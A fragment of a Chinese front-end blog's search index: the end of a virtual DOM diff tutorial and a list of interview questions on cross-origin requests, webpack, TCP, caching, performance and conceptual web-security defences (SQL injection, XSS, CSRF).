class="built_in">document</span>.createElement(<span class="keyword">this</span>.tagName) <span class="comment">// 根据tagName构建</span></span><br><span class="line">  <span class="keyword">var</span> props = <span class="keyword">this</span>.props</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> propName <span class="keyword">in</span> props) { <span class="comment">// 设置节点的DOM属性</span></span><br><span class="line">    <span class="keyword">var</span> propValue = props[propName]</span><br><span class="line">    el.setAttribute(propName, propValue)</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> children = <span class="keyword">this</span>.children || []</span><br><span class="line"></span><br><span class="line">  children.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">child</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> childEl = (child <span class="keyword">instanceof</span> Element)</span><br><span class="line">      ? child.render() <span class="comment">// 如果子节点也是虚拟DOM，递归构建DOM节点</span></span><br><span class="line">      : <span class="built_in">document</span>.createTextNode(child) <span class="comment">// 如果字符串，只构建文本节点</span></span><br><span class="line">    el.appendChild(childEl)</span><br><span class="line">  })</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> el</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ulRoot = ul.render()</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(ulRoot)</span><br></pre></td></tr></tbody></table></figure><p>上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><ul id=<span class="string">'list'</span>></span><br><span class="line">  <li <span class="class"><span class="keyword">class</span></span>=<span class="string">'item'</span>>Item <span class="number">1</span><<span class="regexp">/li></span></span><br><span class="line"><span class="regexp">  <li class='item'>Item 2</</span>li></span><br><span class="line">  <li <span class="class"><span class="keyword">class</span></span>=<span class="string">'item'</span>>Item <span class="number">3</span><<span class="regexp">/li></span></span><br><span class="line"><span class="regexp"></u</span>l></span><br></pre></td></tr></tbody></table></figure><h4 id="3-2-步骤二：比较两棵虚拟DOM树的差异"><a href="#3-2-步骤二：比较两棵虚拟DOM树的差异" class="headerlink" title="3.2 步骤二：比较两棵虚拟DOM树的差异"></a>3.2 步骤二：比较两棵虚拟DOM树的差异</h4><p>正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比：</p><p><img src="https://pic2.zhimg.com/50/6d64b0b7889e7f020bb020aea5947a09_hd.png" alt="image"></p><p>上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。</p><h5 id="3-2-1-深度优先遍历，记录差异"><a href="#3-2-1-深度优先遍历，记录差异" class="headerlink" title="3.2.1 深度优先遍历，记录差异"></a>3.2.1 深度优先遍历，记录差异</h5><p>在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记：</p><p><img src="https://pic2.zhimg.com/50/c4ba535164d29fd46383d19512c37349_hd.png" alt="image"></p><p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// diff 函数，对比两棵树</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">diff</span> (<span class="params">oldTree, newTree</span>) </span>{</span><br><span class="line">  <span class="keyword">var</span> index = <span class="number">0</span> <span class="comment">// 当前节点的标志</span></span><br><span class="line">  <span class="keyword">var</span> patches = {} <span class="comment">// 用来记录每个节点差异的对象</span></span><br><span class="line">  dfsWalk(oldTree, newTree, index, patches)</span><br><span class="line">  <span class="keyword">return</span> patches</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对两棵树进行深度优先遍历</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfsWalk</span> (<span class="params">oldNode, newNode, index, patches</span>) </span>{</span><br><span class="line">  <span class="comment">// 对比oldNode和newNode的不同，记录下来</span></span><br><span class="line">  patches[index] = [...]</span><br><span class="line"></span><br><span class="line">  diffChildren(oldNode.children, newNode.children, index, patches)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历子节点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">diffChildren</span> (<span class="params">oldChildren, newChildren, index, patches</span>) </span>{</span><br><span class="line">  <span class="keyword">var</span> leftNode = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">var</span> currentNodeIndex = index</span><br><span class="line">  oldChildren.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">child, i</span>) </span>{</span><br><span class="line">    <span class="keyword">var</span> newChild = newChildren[i]</span><br><span class="line">    currentNodeIndex = (leftNode && leftNode.count) <span class="comment">// 计算节点的标识</span></span><br><span class="line">      ? currentNodeIndex + leftNode.count + <span class="number">1</span></span><br><span class="line">      : currentNodeIndex + <span class="number">1</span></span><br><span class="line">    dfsWalk(child, newChild, currentNodeIndex, patches) <span class="comment">// 深度遍历子节点</span></span><br><span class="line">    leftNode = child</span><br><span class="line">  })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>例如，上面的div和新的div有差异，当前的标记是0，那么：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patches[<span class="number">0</span>] = [{difference}, {difference}, ...] <span class="comment">// 用数组存储新旧节点的不同</span></span><br></pre></td></tr></tbody></table></figure><h5 id="3-2-2-差异类型"><a href="#3-2-2-差异类型" class="headerlink" title="3.2.2 差异类型"></a>3.2.2 差异类型</h5><p>上面说的节点的差异指的是什么呢？对 DOM 操作可能会：</p><ol><li>替换掉原来的节点，例如把上面的div换成了section</li><li>移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换</li><li>修改了节点的属性</li><li>对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。</li></ol><p>所以我们定义了几种差异类型：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> REPLACE = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> REORDER = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> PROPS = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> TEXT = <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patches[<span class="number">0</span>] = [{</span><br><span class="line">  type: REPALCE,</span><br><span class="line">  node: newNode <span class="comment">// el('section', props, children)</span></span><br><span class="line">}]</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔试面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端面试题</title>
      <link href="/2018/05/06/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/"/>
      <url>/2018/05/06/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="1-如何解决跨域问题"><a href="#1-如何解决跨域问题" class="headerlink" title="==1. 如何解决跨域问题=="></a>==1. 如何解决跨域问题==</h2><h4 id="JSONP："><a href="#JSONP：" class="headerlink" title="JSONP："></a><strong>JSONP：</strong></h4><p>原理是：动态插入script标签，通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。</p><p>由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。</p><p>优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。</p><p>JSONP：json+padding（内填充），顾名思义，就是把JSON填充到一个盒子里</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><script></span><br><span class="line">    function createJs(sUrl){</span><br><span class="line">        var oScript = document.createElement('script');</span><br><span class="line">        oScript.type = 'text/javascript';</span><br><span class="line">        oScript.src = sUrl;</span><br><span class="line">        document.getElementsByTagName('head')[0].appendChild(oScript);</span><br><span class="line">    }</span><br><span class="line">    createJs('jsonp.js');</span><br><span class="line">    box({</span><br><span class="line">       'name': 'test'</span><br><span class="line">    });</span><br><span class="line">    function box(json){</span><br><span class="line">        alert(json.name);</span><br><span class="line">    }</span><br><span class="line"></script></span><br></pre></td></tr></tbody></table></figure><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a><strong>CORS</strong></h4><p>服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。</p><h4 id="通过修改document-domain来跨子域"><a href="#通过修改document-domain来跨子域" class="headerlink" title="通过修改document.domain来跨子域"></a><strong>通过修改document.domain来跨子域</strong></h4><p>将子域和主域的document.domain设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用document.domain进行跨域</p><p>主域相同的使用document.domain</p><h4 id="使用window-name来进行跨域"><a href="#使用window-name来进行跨域" class="headerlink" title="使用window.name来进行跨域"></a><strong>使用window.name来进行跨域</strong></h4><p>window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的</p><h4 id="使用HTML5中新引进的window-postMessage方法来跨域传送数据"><a href="#使用HTML5中新引进的window-postMessage方法来跨域传送数据" class="headerlink" title="使用HTML5中新引进的window.postMessage方法来跨域传送数据"></a><strong>使用HTML5中新引进的window</strong>.postMessage方法来跨域传送数据</h4><p>还有flash、在服务器上设置代理页面等跨域方式。个人认为window.name的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。</p><h2 id="2-XML和JSON的区别？"><a href="#2-XML和JSON的区别？" class="headerlink" title="==2. XML和JSON的区别？=="></a>==2. XML和JSON的区别？==</h2><p>(1).数据体积方面。JSON相对于XML来讲，数据的体积小，传递的速度更快些。</p><p>(2).数据交互方面。JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。</p><p>(3).数据描述方面。JSON对数据的描述性比XML较差。</p><p>(4).传输速度方面。JSON的速度要远远快于XML。</p><h2 id="3-谈谈你对webpack的看法"><a href="#3-谈谈你对webpack的看法" class="headerlink" title="==3. 谈谈你对webpack的看法=="></a>==3. 谈谈你对webpack的看法==</h2><p>WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源。</p><p>webpack的两大特色：</p><ol><li>code splitting（可以自动完成）</li><li>loader 可以处理各种类型的静态文件，并且支持串联操作</li></ol><p>webpack 是以commonJS的形式来书写脚本滴，但对 AMD/CMD 的支持也很全面，方便旧项目进行代码迁移。</p><p>webpack具有requireJs和browserify的功能，</p><ol><li>但仍有很多自己的新特性：<br>对 CommonJS 、 AMD 、ES6的语法做了兼容</li><li>对js、css、图片等资源文件都支持打包</li><li>串联式模块加载器以及插件机制，让其具有更好的灵活性和扩展性，例如提供对CoffeeScript、ES6的支持</li><li>有独立的配置文件webpack.config.js</li><li>可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间</li><li>支持 SourceUrls 和 SourceMaps，易于调试</li><li>具有强大的Plugin接口，大多是内部插件，使用起来比较灵活</li><li>webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快</li></ol><h2 id="4-说说TCP传输的三次握手四次挥手策略"><a href="#4-说说TCP传输的三次握手四次挥手策略" class="headerlink" title="==4. 说说TCP传输的三次握手四次挥手策略=="></a>==4. 说说TCP传输的三次握手四次挥手策略==</h2><p>为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。用TCP协议把数据包送出去后，TCP不会对传送 后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：SYN和ACK。</p><p>发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。</p><p>最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。<br>若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。</p><h4 id="断开一个TCP连接则需要“四次挥手”："><a href="#断开一个TCP连接则需要“四次挥手”：" class="headerlink" title="断开一个TCP连接则需要“四次挥手”："></a><strong>断开一个TCP连接则需要“四次挥手”：</strong></h4><ul><li>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。</li><li>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号）。</li><li>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。</li><li>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</li></ul><h2 id="5-TCP和UDP的区别"><a href="#5-TCP和UDP的区别" class="headerlink" title="==5. TCP和UDP的区别=="></a>==5. TCP和UDP的区别==</h2><p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来</p><p>UDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！<br>UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。</p><h2 id="6-说说你对作用域链的理解"><a href="#6-说说你对作用域链的理解" class="headerlink" title="==6. 说说你对作用域链的理解=="></a>==6. 说说你对作用域链的理解==</h2><p>作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的。</p><h2 id="7-创建ajax过程"><a href="#7-创建ajax过程" class="headerlink" title="==7. 创建ajax过程=="></a>==7. 创建ajax过程==</h2><ol><li>创建XMLHttpRequest对象,也就是创建一个异步调用对象.</li><li>创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息.</li><li>设置响应HTTP请求状态变化的函数.</li><li>发送HTTP请求.</li><li>获取异步调用返回的数据.</li><li>使用JavaScript和DOM实现局部刷新.</li></ol><h2 id="8-常见web安全及防护原理"><a href="#8-常见web安全及防护原理" class="headerlink" title="==8. 常见web安全及防护原理=="></a>==8. 常见web安全及防护原理==</h2><h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a><strong>sql注入原理</strong></h4><p>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><p>总的来说有以下几点：</p><ol><li>永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。</li><li>永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。</li></ol><h4 id="XSS原理及防范"><a href="#XSS原理及防范" class="headerlink" title="XSS原理及防范"></a><strong>XSS原理及防范</strong></h4><p>Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意 html标签或者javascript代码。</p><p>比如：攻击者在论坛中放一个<br>看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，<br>当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。</p><h4 id="XSS防范方法"><a href="#XSS防范方法" class="headerlink" title="XSS防范方法"></a><strong>XSS防范方法</strong></h4><p>首先代码里对用户输入的地方和变量都需要仔细检查长度和对”<”,”>”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。</p><p>首先，避免直接在cookie 中泄露用户隐私，例如email、密码等等。</p><p>其次，通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。</p><p>如果网站不需要再浏览器端对cookie 进行操作，可以在Set-Cookie 末尾加上HttpOnly 来防止javascript 代码直接获取cookie 。</p><p>尽量采用POST 而非GET 提交表单</p><h4 id="XSS与CSRF有什么区别吗？"><a href="#XSS与CSRF有什么区别吗？" class="headerlink" title="XSS与CSRF有什么区别吗？"></a><strong>XSS与CSRF有什么区别吗？</strong></h4><p>XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。<br>要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><ul><li>登录受信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ul><h4 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a><strong>CSRF的防御</strong></h4><ul><li>服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</li><li>通过验证码的方法</li></ul><h2 id="9-Web-Worker-和webSocket"><a href="#9-Web-Worker-和webSocket" class="headerlink" title="==9. Web Worker 和webSocket=="></a>==9. Web Worker 和webSocket==</h2><h4 id="worker主线程"><a href="#worker主线程" class="headerlink" title="worker主线程:"></a><strong>worker主线程:</strong></h4><ol><li>通过 worker = new Worker( url ) 加载一个JS文件来创建一个worker，同时返回一个worker实例。</li><li>通过worker.postMessage( data ) 方法来向worker发送数据。</li><li>绑定worker.onmessage方法来接收worker发送过来的数据。</li><li>可以使用 worker.terminate() 来终止一个worker的执行。</li></ol><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a><strong>WebSocket</strong></h4><p>WebSocket是Web应用程序的传输协议，它提供了双向的，按序到达的数据流。他是一个HTML5协议，WebSocket的连接是持久的，他通过在客户端和服务器之间保持双工连接，服务器的更新可以被及时推送给客户端，而不需要客户端以一定时间间隔去轮询。</p><h2 id="10-HTTP和HTTPS"><a href="#10-HTTP和HTTPS" class="headerlink" title="==10. HTTP和HTTPS=="></a>==10. HTTP和HTTPS==</h2><p>HTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS。</p><p>默认HTTP的端口号为80，HTTPS的端口号为443。</p><h2 id="11-为什么HTTPS安全"><a href="#11-为什么HTTPS安全" class="headerlink" title="==11. 为什么HTTPS安全=="></a>==11. 为什么HTTPS安全==</h2><p>因为网络请求需要中间有很多的服务器路由器的转发。中间的节点都可能篡改信息，而如果使用HTTPS，密钥在你和终点站才有。https之所以比http安全，是因为他利用ssl/tls协议传输。它包含证书，卸载，流量转发，负载均衡，页面适配，浏览器适配，refer传递等。保障了传输过程的安全性</p><h2 id="12-对前端模块化的认识"><a href="#12-对前端模块化的认识" class="headerlink" title="==12. 对前端模块化的认识=="></a>==12. 对前端模块化的认识==</h2><ul><li>AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。</li><li>CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。</li></ul><p>AMD 是提前执行，CMD 是延迟执行。</p><p>AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。</p><p>CMD模块方式</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(function(require, exports, module) {</span><br><span class="line">  // 模块代码</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h2 id="13-Javascript垃圾回收方法"><a href="#13-Javascript垃圾回收方法" class="headerlink" title="==13. Javascript垃圾回收方法=="></a>==13. Javascript垃圾回收方法==</h2><h4 id="标记清除（mark-and-sweep）"><a href="#标记清除（mark-and-sweep）" class="headerlink" title="标记清除（mark and sweep）"></a><strong>标记清除（mark and sweep）</strong></h4><p>这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。</p><p>垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了</p><h4 id="引用计数-reference-counting"><a href="#引用计数-reference-counting" class="headerlink" title="引用计数(reference counting)"></a><strong>引用计数(reference counting)</strong></h4><p>在低版本IE中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。</p><p>在IE中虽然JavaScript对象通过标记清除的方式进行垃圾回收，但BOM与DOM对象却是通过引用计数回收垃圾的，<br>也就是说只要涉及BOM及DOM就会出现循环引用问题。</p><h2 id="14-你觉得前端工程的价值体现在哪"><a href="#14-你觉得前端工程的价值体现在哪" class="headerlink" title="==14. 你觉得前端工程的价值体现在哪=="></a>==14. 你觉得前端工程的价值体现在哪==</h2><ul><li>为简化用户使用提供技术支持（交互部分）</li><li>为多个浏览器兼容性提供支持</li><li>为提高用户浏览速度（浏览器性能）提供支持</li><li>为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持</li><li>为展示数据提供支持（数据接口）</li></ul><h2 id="15-谈谈性能优化问题"><a href="#15-谈谈性能优化问题" class="headerlink" title="==15. 谈谈性能优化问题=="></a>==15. 谈谈性能优化问题==</h2><p>缓存利用：缓存Ajax，使用CDN，使用外部js和css文件以便缓存，添加Expires头，服务端配置Etag，减少DNS查找等</p><p>请求数量：合并样式和脚本，使用css图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载。</p><p>请求带宽：压缩文件，开启GZIP，</p><p>代码层面的优化：</p><ul><li>避免使用css表达式，避免使用高级选择器，通配选择器。</li><li>用hash-table来优化查找</li><li>少用全局变量</li><li>用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能</li><li>用setTimeout来避免页面失去响应</li><li>缓存DOM节点查找的结果</li><li>避免使用CSS Expression</li><li>避免全局查询</li><li>避免使用with(with会创建自己的作用域，会增加作用域链长度)</li><li>多个变量声明合并</li><li>避免图片和iFrame等的空Src。空Src会重新加载当前页面，影响速度和效率</li><li>尽量避免写在HTML标签中写Style属性</li></ul><h2 id="16-移动端性能优化"><a href="#16-移动端性能优化" class="headerlink" title="==16. 移动端性能优化=="></a>==16. 移动端性能优化==</h2><ul><li>尽量使用css3动画，开启硬件加速。</li><li>适当使用touch事件代替click事件。</li><li>避免使用css3渐变阴影效果。</li><li>可以用transform: translateZ(0)来开启硬件加速。</li><li>不滥用Float。Float在渲染时计算量比较大，尽量减少使用</li><li>不滥用Web字体。Web字体需要下载，解析，重绘当前页面，尽量减少使用。</li><li>合理使用requestAnimationFrame动画代替setTimeout</li><li>CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加</li><li>PC端的在移动端同样适用</li></ul><h2 id="17-什么是Etag？"><a href="#17-什么是Etag？" class="headerlink" title="==17. 什么是Etag？=="></a>==17. 什么是Etag？==</h2><p>当发送一个服务器请求时，浏览器首先会进行缓存过期判断。浏览器根据缓存过期时间判断缓存文件是否过期。</p><p>情景一：若没有过期，则不向服务器发送请求，直接使用缓存中的结果，此时我们在浏览器控制台中可以看到 200 OK(from cache) ，此时的情况就是完全使用缓存，浏览器和服务器没有任何交互的。</p><p>情景二：若已过期，则向服务器发送请求，此时请求中会带上①中设置的文件修改时间，和Etag</p><p>然后，进行资源更新判断。服务器根据浏览器传过来的文件修改时间，判断自浏览器上一次请求之后，文件是不是没有被修改过；根据Etag，判断文件内容自上一次请求之后，有没有发生变化</p><p>情形一：若两种判断的结论都是文件没有被修改过，则服务器就不给浏览器发index.html的内容了，直接告诉它，文件没有被修改过，你用你那边的缓存吧—— 304 Not Modified，此时浏览器就会从本地缓存中获取index.html的内容。此时的情况叫协议缓存，浏览器和服务器之间有一次请求交互。</p><p>情形二：若修改时间和文件内容判断有任意一个没有通过，则服务器会受理此次请求，之后的操作同</p><p>只有get请求会被缓存，post请求不会</p><h2 id="18-Expires和Cache-Control"><a href="#18-Expires和Cache-Control" class="headerlink" title="==18. Expires和Cache-Control=="></a>==18. Expires和Cache-Control==</h2><p>Expires要求客户端和服务端的时钟严格同步。HTTP1.1引入Cache-Control来克服Expires头的限制。如果max-age和Expires同时出现，则max-age有更高的优先级。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-cache, private, max-age=0</span><br><span class="line">ETag: abcde</span><br><span class="line">Expires: Thu, 15 Apr 2014 20:00:00 GMT</span><br><span class="line">Pragma: private</span><br><span class="line">Last-Modified: $now // RFC1123 format</span><br></pre></td></tr></tbody></table></figure><h2 id="19-ETag应用"><a href="#19-ETag应用" class="headerlink" title="==19. ETag应用:=="></a>==19. ETag应用:==</h2><p>Etag由服务器端生成，客户端通过If-Match或者说If-None-Match这个条件判断请求来验证资源是否修改。常见的是使用If-None-Match。请求一个文件的流程可能如下：</p><p>====第一次请求===</p><blockquote><p>客户端发起 HTTP GET 请求一个文件；</p><p>服务器处理请求，返回文件内容和一堆Header，当然包括Etag(例如”2e681a-6-5d044840”)(假设服务器支持Etag生成和已经开启了Etag).状态码200</p></blockquote><p>====第二次请求===</p><blockquote><p>客户端发起 HTTP GET 请求一个文件，注意这个时候客户端同时发送一个If-None-Match头，这个头的内容就是第一次请求时服务器返回的Etag：2e681a-6-5d0448402.<br>服务器判断发送过来的Etag和计算出来的Etag匹配，因此If-None-Match为False，不返回200，返回304，客户端继续使用本地缓存；流程很简单，问题是，如果服务器又设置了Cache-Control:max-age和Expires呢，怎么办</p></blockquote><p>答案是同时使用，也就是说在完全匹配If-Modified-Since和If-None-Match即检查完修改时间和Etag之后，</p><p>服务器才能返回304.(不要陷入到底使用谁的问题怪圈)</p><p>为什么使用Etag请求头?</p><p>Etag 主要为了解决 Last-Modified 无法解决的一些问题。</p><h2 id="20-栈和队列的区别"><a href="#20-栈和队列的区别" class="headerlink" title="==20. 栈和队列的区别?=="></a>==20. 栈和队列的区别?==</h2><p>栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的。</p><p>队列先进先出，栈先进后出。</p><p>栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除</p><h2 id="21-栈和堆的区别？"><a href="#21-栈和堆的区别？" class="headerlink" title="==21. 栈和堆的区别？=="></a>==21. 栈和堆的区别？==</h2><p>栈区（stack）—   由编译器自动分配释放   